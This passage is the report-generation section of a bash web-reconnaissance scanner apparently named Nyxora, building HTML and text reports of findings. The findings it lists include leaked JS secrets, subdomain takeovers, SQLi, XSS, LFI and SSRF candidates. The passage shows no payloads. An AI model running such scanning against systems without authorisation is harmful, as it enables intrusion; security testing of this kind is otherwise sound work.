    <div class="card info"><div class="card-n">${LN}</div><div class="card-l">Live Hosts</div></div>
    <div class="card info"><div class="card-n">${SN}</div><div class="card-l">Subdomains</div></div>
    <div class="card info"><div class="card-n">${CN}</div><div class="card-l">URLs</div></div>
    <div class="card info"><div class="card-n">${DN}</div><div class="card-l">Dyn Params</div></div>
    <div class="card info"><div class="card-n">${APIN}</div><div class="card-l">API Ends</div></div>
  </div>
  <div class="section-title">Pipeline</div>
  <div id="tl"></div>
</div>
<div id="view-hosts" class="view"><div class="section-title">Live Hosts</div><div id="hosts-body"></div></div>
<div id="view-subs" class="view"><div class="section-title">Resolved Subdomains</div><div id="subs-body"></div></div>
<div id="view-secrets" class="view"><div class="section-title">🔴 JS Secrets (30 patterns)</div><div id="secrets-body"></div></div>
<div id="view-takeover" class="view"><div class="section-title">🔴 Takeover Candidates (35 sigs)</div><div id="takeover-body"></div></div>
<div id="view-cors" class="view"><div class="section-title">🔴 CORS Misconfigurations</div><div id="cors-body"></div></div>
<div id="view-idor" class="view"><div class="section-title">🔴 IDOR Candidates</div><div id="idor-body"></div></div>
<div id="view-xss" class="view"><div class="section-title">🟠 XSS Candidates</div><div id="xss-body"></div></div>
<div id="view-sqli" class="view"><div class="section-title">🟠 SQLi Candidates</div><div id="sqli-body"></div></div>
<div id="view-lfi" class="view"><div class="section-title">🟠 LFI / Path Traversal</div><div id="lfi-body"></div></div>
<div id="view-hostinj" class="view"><div class="section-title">🟠 Host Header Injection</div><div id="hostinj-body"></div></div>
<div id="view-graphql" class="view"><div class="section-title">🟡 GraphQL Endpoints</div><div id="graphql-body"></div></div>
<div id="view-methods" class="view"><div class="section-title">🟡 HTTP Method Issues</div><div id="methods-body"></div></div>
<div id="view-cache" class="view"><div class="section-title">🟡 Cache Poisoning Hints</div><div id="cache-body"></div></div>
<div id="view-redir" class="view"><div class="section-title">🟡 Open Redirects</div><div id="redir-body"></div></div>
<div id="view-ssrf" class="view"><div class="section-title">🟡 SSRF Patterns</div><div id="ssrf-body"></div></div>
<div id="view-api" class="view"><div class="section-title">🔵 API Endpoints</div><div id="api-body"></div></div>
<div id="view-params" class="view"><div class="section-title">Dynamic Parameters</div><div id="params-body"></div></div>
<div id="view-headers" class="view"><div class="section-title">Security Header Gaps</div><div id="headers-body"></div></div>
</div></div>
<script>
HTMLEOF

  { echo "${IDOR_JS}"; echo "${REDIR_JS}"; echo "${XSS_JS}"; echo "${SQLI_JS}"; echo "${SSRF_JS}"
    echo "${SUBS_JS}"; echo "${LIVE_JS}"; echo "${DYN_JS}"; echo "${SEC_JS}"; echo "${CORS_JS}"
    echo "${TKO_JS}"; echo "${HDR_JS}"; echo "${GQL_JS}"; echo "${MTH_JS}"; echo "${HHI_JS}"
    echo "${LFI_JS}"; echo "${CACHE_JS}"; echo "${API_JS}"; } >> "${HTML_REPORT}"

  cat >> "${HTML_REPORT}" << 'JSEOF'
const META_EL=document.getElementById('tl');
if(META_EL)META_EL.innerHTML=[
  ['Subdomain Enumeration (12+ sources)','Passive sources → resolved + body-hash wildcard pruning (4-probe)'],
  ['Security Header Audit','CSP · HSTS · X-Frame · CORS · null-origin · COOP · Permissions-Policy'],
  ['JS Secret Scanner (30 patterns)','AWS · GCP · Stripe · GitHub · JWT · Firebase · Shopify · ...'],
  ['Takeover Fingerprinting (35 sigs)','CNAME chain + body signature + DNS_DANGLING detection'],
  ['GraphQL Discovery','13 common GraphQL/GQL paths probed with introspection check'],
  ['HTTP Method Enumeration','OPTIONS · PUT · DELETE · PATCH · TRACE/XST'],
  ['Host Header Injection','7 header variants tested with random canary tracking'],
  ['Cache Poisoning Hints','Unkeyed header and scheme-shift detection'],
  ['API Version Discovery','18 common API path prefixes probed (single-call)'],
  ['URL Crawl + Wayback','HTML/JS extraction + 10k passive URL harvest'],
  ['Diff Engine (4-probe)','All 4 mutations must differ; empty-body guard; 15% spread gate'],
  ['IDOR Engine','Size gate → numeric ID + UUID probing with gap analysis'],
  ['XSS Engine (3-layer gate)','Random canary; entity/URL/unicode encoding gates; CSP detection'],
  ['SQLi Engine (8 payloads)','20 DB error patterns · WAF skip · baseline gate · portable URL encode'],
  ['LFI Engine','8 traversal payloads + null-byte; pre-filtered to file/path params only'],
  ['SSRF · Redirects · Headers','25 SSRF param names · 3-scheme redirect test · OOB redirect-chain confirm'],
].map(([l,c])=>'<div class="tli"><div class="tld"></div><div><div class="tll">'+l+'</div><div class="tlc">'+c+'</div></div></div>').join('');

function show(name){
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.getElementById('view-'+name)?.classList.add('active');
  document.querySelectorAll('.nav-item').forEach(n=>{n.classList.remove('active');if(n.getAttribute('onclick')?.includes("'"+name+"'"))n.classList.add('active');});
  const m={hosts:()=>renderHosts(),subs:()=>renderList('subs-body',SUBS_D),params:()=>renderList('params-body',DYN_D),
    idor:()=>renderF('idor-body',IDOR_D,'pill-crit','CRITICAL'),xss:()=>renderF('xss-body',XSS_D,'pill-high','HIGH'),
    sqli:()=>renderF('sqli-body',SQLI_D,'pill-high','HIGH'),lfi:()=>renderF('lfi-body',LFI_D,'pill-high','HIGH'),
    hostinj:()=>renderF('hostinj-body',HHI_D,'pill-high','HIGH'),graphql:()=>renderF('graphql-body',GQL_D,'pill-med','MEDIUM'),
    methods:()=>renderF('methods-body',MTH_D,'pill-med','MEDIUM'),cache:()=>renderF('cache-body',CACHE_D,'pill-med','MEDIUM'),
    redir:()=>renderF('redir-body',REDIR_D,'pill-med','MEDIUM'),ssrf:()=>renderF('ssrf-body',SSRF_D,'pill-med','MEDIUM'),
    secrets:()=>renderF('secrets-body',SEC_D,'pill-crit','CRITICAL'),takeover:()=>renderF('takeover-body',TKO_D,'pill-crit','CRITICAL'),
    cors:()=>renderF('cors-body',CORS_D,'pill-crit','HIGH'),headers:()=>renderF('headers-body',HDR_D,'pill-info','INFO'),
    api:()=>renderF('api-body',API_D,'pill-info','INFO')};
  m[name]?.();
}
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function renderF(id,data,pill,label){
  const el=document.getElementById(id);if(!el||el.dataset.r)return;el.dataset.r='1';
  if(!data.length){el.innerHTML='<div class="empty">✓ No findings in this category.</div>';return;}
  const PAGE=50;let page=0;let filtered=[...data];
  function render(){el.innerHTML='<div class="toolbar"><input class="si" placeholder="Filter..." id="'+id+'-s"><button class="cbtn" onclick="copyF(\''+id+'\')">Copy All</button></div>';
    document.getElementById(id+'-s').addEventListener('input',function(){filtered=data.filter(d=>d.toLowerCase().includes(this.value.toLowerCase()));page=0;rp();});rp();}
  function rp(){el.querySelector('.tbl')?.remove();el.querySelector('.pag')?.remove();
    const slice=filtered.slice(page*PAGE,(page+1)*PAGE);const total=Math.ceil(filtered.length/PAGE);
    const d=document.createElement('div');d.className='tbl';
    d.innerHTML='<table class="ftable"><thead><tr><th>#</th><th>Finding</th><th>Severity</th></tr></thead><tbody>'+
      slice.map((u,i)=>'<tr><td style="color:var(--text3);width:40px">'+(page*PAGE+i+1)+'</td><td class="url">'+esc(u)+'</td><td><span class="pill '+pill+'">'+label+'</span></td></tr>').join('')+'</tbody></table>';
    el.appendChild(d);
    if(total>1){const p=document.createElement('div');p.className='pag';
      p.innerHTML='<span>'+filtered.length+' items</span><button class="pbtn" '+(page===0?'disabled':'')+'id="'+id+'-pv">‹</button><span>Page '+(page+1)+' / '+total+'</span><button class="pbtn" '+(page>=total-1?'disabled':'')+'id="'+id+'-nx">›</button>';
      el.appendChild(p);document.getElementById(id+'-pv').onclick=()=>{if(page>0){page--;rp();}};
      document.getElementById(id+'-nx').onclick=()=>{if(page<total-1){page++;rp();}};}}
  render();}
function renderList(id,data){
  const el=document.getElementById(id);if(!el||el.dataset.r)return;el.dataset.r='1';
  if(!data.length){el.innerHTML='<div class="empty">Empty.</div>';return;}
  const PAGE=100;let page=0;let filtered=[...data];
  function render(){el.innerHTML='<div class="toolbar"><input class="si" placeholder="Filter..." id="'+id+'-s"><button class="cbtn" onclick="copyL(\''+id+'\')">Copy All</button></div>';
    document.getElementById(id+'-s').addEventListener('input',function(){filtered=data.filter(d=>d.toLowerCase().includes(this.value.toLowerCase()));page=0;rp();});rp();}
  function rp(){el.querySelector('.cblock')?.remove();el.querySelector('.pag')?.remove();
    const d=document.createElement('div');d.className='cblock';d.textContent=filtered.slice(page*PAGE,(page+1)*PAGE).join('\n');el.appendChild(d);
    const total=Math.ceil(filtered.length/PAGE);
    if(total>1){const p=document.createElement('div');p.className='pag';
      p.innerHTML='<span>'+filtered.length+' items</span><button class="pbtn" '+(page===0?'disabled':'')+'id="'+id+'-pv">‹</button><span>Page '+(page+1)+' / '+total+'</span><button class="pbtn" '+(page>=total-1?'disabled':'')+'id="'+id+'-nx">›</button>';
      el.appendChild(p);document.getElementById(id+'-pv').onclick=()=>{if(page>0){page--;rp();}};
      document.getElementById(id+'-nx').onclick=()=>{if(page<total-1){page++;rp();}};}}
  render();}
function renderHosts(){
  const el=document.getElementById('hosts-body');if(!el||el.dataset.r)return;el.dataset.r='1';
  const g=document.createElement('div');g.className='hgrid';
  LIVE_D.forEach(line=>{const p=line.split(' ');const url=p[0];const tags=p.slice(1);
    const ct=tags.find(t=>/^\[\d+\]$/.test(t))||'';const code=ct.replace(/[\[\]]/g,'');
    const cls=code==='200'?'c200':code==='403'?'c403':['301','302','307'].includes(code)?'c301':'';
    g.innerHTML+='<div class="hcard"><div class="hurl">'+esc(url)+'</div><div class="htags">'+tags.map(t=>'<span class="htag '+(t.includes(code)?cls:'')+'">'+esc(t)+'</span>').join('')+'</div></div>';});
  el.appendChild(g);}
function copyF(id){navigator.clipboard.writeText(Array.from(document.querySelectorAll('#'+id+' td.url')).map(r=>r.textContent).join('\n'));}
function copyL(id){const b=document.querySelector('#'+id+' .cblock');if(b)navigator.clipboard.writeText(b.textContent);}
JSEOF
  echo "</script></body></html>" >> "${HTML_REPORT}"
  log "HTML report: ${HTML_REPORT}"
fi

# ════════════════════════════════════════════════════════════════════════════
# Text Report
REPORT="${OUT}/final/report.txt"
{
printf '%s\n' "╔══════════════════════════════════════════════════════════════════════╗"
printf '%s\n' "║   NYXORA v${VERSION} — ZERO DEPENDENCY EDITION                       ║"
printf '%s\n' "╚══════════════════════════════════════════════════════════════════════╝"
echo "  Target  : ${DOMAIN} | Date: ${START_DATE} | Runtime: ${ELAPSED_FMT}"
echo ""
for sec_data in \
  "🔴 CRITICAL — JS Secrets|${OUT}/engine/secrets/findings.txt" \
  "🔴 CRITICAL — Subdomain Takeover|${OUT}/engine/takeover/candidates.txt" \
  "🔴 CRITICAL — CORS Misconfigurations|${OUT}/engine/headers/cors_issues.txt" \
  "🔴 CRITICAL — IDOR Candidates|${OUT}/engine/behavior/idor.txt" \
  "🟠 HIGH — XSS Candidates|${OUT}/engine/reflection/xss_candidates.txt" \
  "🟠 HIGH — SQLi Candidates|${OUT}/engine/reflection/sqli_candidates.txt" \
  "🟠 HIGH — LFI Candidates|${OUT}/engine/lfi/candidates.txt" \
  "🟠 HIGH — Host Header Injection|${OUT}/engine/hostinj/findings.txt" \
  "🟡 MEDIUM — GraphQL Endpoints|${OUT}/engine/graphql/endpoints.txt" \
  "🟡 MEDIUM — HTTP Method Issues|${OUT}/engine/methods/findings.txt" \
  "🟡 MEDIUM — Cache Poisoning Hints|${OUT}/engine/cache/hints.txt" \
  "🟡 MEDIUM — Open Redirects|${OUT}/engine/behavior/open_redirects.txt" \
  "🟡 MEDIUM — SSRF Patterns|${OUT}/engine/reflection/ssrf_candidates.txt"; do
  IFS='|' read -r slabel sfile <<< "${sec_data}"
  echo "══════════════════════════════════════════════════════════════════════"
  echo "  ${slabel}"
  echo "══════════════════════════════════════════════════════════════════════"
  [[ -s "${sfile}" ]] && cat "${sfile}" || echo "  (none)"
  echo ""
done
echo "══════════════════════════════════════════════════════════════════════"
echo "  📊  STATS"
echo "══════════════════════════════════════════════════════════════════════"
echo "  Subdomains   : $(count_safe "${OUT}/subs/raw.txt") raw / $(count_safe "${OUT}/subs/resolved.txt") resolved"
echo "  Live hosts   : $(count_safe "${OUT}/http/live.txt")"
echo "  JS secrets   : $(count_safe "${OUT}/engine/secrets/findings.txt")"
echo "  Takeover     : $(count_safe "${OUT}/engine/takeover/candidates.txt")"
echo "  CORS         : $(count_safe "${OUT}/engine/headers/cors_issues.txt")"
echo "  GraphQL      : $(count_safe "${OUT}/engine/graphql/endpoints.txt")"
echo "  Methods      : $(count_safe "${OUT}/engine/methods/findings.txt")"
echo "  Host Inj.    : $(count_safe "${OUT}/engine/hostinj/findings.txt")"
echo "  Cache Hints  : $(count_safe "${OUT}/engine/cache/hints.txt")"
echo "  LFI          : $(count_safe "${OUT}/engine/lfi/candidates.txt")"
echo "  Crawled URLs : $(count_safe "${OUT}/crawl/crawled_urls.txt")"
echo "  Dynamic params: $(count_safe "${OUT}/engine/diff/dynamic.txt")"
echo "  IDOR         : $(count_safe "${OUT}/engine/behavior/idor.txt")"
echo "  XSS          : $(count_safe "${OUT}/engine/reflection/xss_candidates.txt")"
echo "  SQLi         : $(count_safe "${OUT}/engine/reflection/sqli_candidates.txt")"
echo "  Redirects    : $(count_safe "${OUT}/engine/behavior/open_redirects.txt")"
echo "  SSRF         : $(count_safe "${OUT}/engine/reflection/ssrf_candidates.txt")"
echo "  API Endpoints: $(count_safe "${OUT}/engine/behavior/api_endpoints.txt")"
echo ""
echo "  Data  → ${OUT}/"
[[ "${SKIP_REPORT}" != true ]] && echo "  HTML  → ${HTML_REPORT}"
echo "  MD    → ${MD_REPORT}"
echo "══════════════════════════════════════════════════════════════════════"
echo "  Built by github.com/thivyas111-pixel/nyxora"
echo "══════════════════════════════════════════════════════════════════════"
} | tee "${REPORT}"

echo
echo -e "${BOLD}${GREEN}╔════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${GREEN}║  ✓ DONE  Nyxora v${VERSION}  ⏱ ${ELAPSED_FMT}         ${RESET}"
echo -e "${BOLD}${GREEN}╚════════════════════════════════════════════════════╝${RESET}"
echo
[[ "${SKIP_REPORT}" != true ]] && echo -e "  ${CYAN}HTML:    ${RESET}${BOLD}${HTML_REPORT}${RESET}"
echo -e "  ${CYAN}Markdown:${RESET}${BOLD}${MD_REPORT}${RESET}"
echo -e "  ${CYAN}TXT:     ${RESET}${BOLD}${REPORT}${RESET}"
echo -e "  ${CYAN}Data:    ${RESET}${BOLD}${OUT}/${RESET}"